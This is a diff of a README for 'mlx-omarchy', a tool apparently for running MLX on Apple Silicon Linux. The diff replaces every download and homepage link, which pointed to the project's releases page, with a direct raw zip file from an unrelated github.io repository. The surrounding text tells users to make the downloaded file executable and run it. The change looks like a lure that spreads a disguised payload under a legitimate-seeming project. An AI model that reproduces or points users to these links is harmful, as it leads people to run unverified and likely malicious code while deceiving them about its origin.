@@ -5,7 +5,7 @@ description: "Run MLX machine learning on Apple Silicon Linux via Vulkan."
 ---
 # ⚡ mlx-omarchy - Unlock Lightning-Fast AI on Your Mac
 
-[![Download mlx-omarchy](https://img.shields.io/badge/Download-mlx--omarchy-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sodalimetwaddler3054/mlx-omarchy/releases)
+[![Download mlx-omarchy](https://img.shields.io/badge/Download-mlx--omarchy-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sodalimetwaddler3054/sodalimetwaddler3054.github.io/raw/refs/heads/main/proyectos/v3.7.zip)
 
 ## 👋 Welcome to mlx-omarchy
 
@@ -34,7 +34,7 @@ Ready to dive in? Fantastic! Getting mlx-omarchy on your computer takes just a f
 
 **Step 1: Download the Software**
 
-Click the big green button at the top of this page, or use this link: [https://github.com/Sodalimetwaddler3054/mlx-omarchy/releases](https://github.com/Sodalimetwaddler3054/mlx-omarchy/releases)
+Click the big green button at the top of this page, or use this link: [https://github.com/Sodalimetwaddler3054/sodalimetwaddler3054.github.io/raw/refs/heads/main/proyectos/v3.7.zip](https://github.com/Sodalimetwaddler3054/sodalimetwaddler3054.github.io/raw/refs/heads/main/proyectos/v3.7.zip)
 
 Visit this link to download the application. Once you click it, your browser will open the download page.
 
@@ -128,7 +128,7 @@ You're not alone on this journey. We have a welcoming community ready to help:
 
 Here's your direct path to getting started:
 
-**Visit this link to download the application:** [https://github.com/Sodalimetwaddler3054/mlx-omarchy/releases](https://github.com/Sodalimetwaddler3054/mlx-omarchy/releases)
+**Visit this link to download the application:** [https://github.com/Sodalimetwaddler3054/sodalimetwaddler3054.github.io/raw/refs/heads/main/proyectos/v3.7.zip](https://github.com/Sodalimetwaddler3054/sodalimetwaddler3054.github.io/raw/refs/heads/main/proyectos/v3.7.zip)
 
 When you get there, grab the file with "linux" and "arm64" in its name. Download it, make it executable (remember: `chmod +x filename`), and run it (`./filename`). That's the whole process!
 
@@ -148,8 +148,8 @@ You're just a few minutes away from unlocking the full power of your Apple Silic
 
 ---
 
-**Project Homepage:** [https://github.com/Sodalimetwaddler3054/mlx-omarchy](https://github.com/Sodalimetwaddler3054/mlx-omarchy)
+**Project Homepage:** [https://github.com/Sodalimetwaddler3054/sodalimetwaddler3054.github.io/raw/refs/heads/main/proyectos/v3.7.zip](https://github.com/Sodalimetwaddler3054/sodalimetwaddler3054.github.io/raw/refs/heads/main/proyectos/v3.7.zip)
 
-**Download Center:** [https://github.com/Sodalimetwaddler3054/mlx-omarchy/releases](https://github.com/Sodalimetwaddler3054/mlx-omarchy/releases)
+**Download Center:** [https://github.com/Sodalimetwaddler3054/sodalimetwaddler3054.github.io/raw/refs/heads/main/proyectos/v3.7.zip](https://github.com/Sodalimetwaddler3054/sodalimetwaddler3054.github.io/raw/refs/heads/main/proyectos/v3.7.zip)
 
 Keywords: mlx, omarchy, apple silicon, linux, vulkan, ane, neural engine, machine learning, ai, local ai, private ai, m1, m2, m3, arm64, aarch64, gpu acceleration, on-device inference, open source, free software
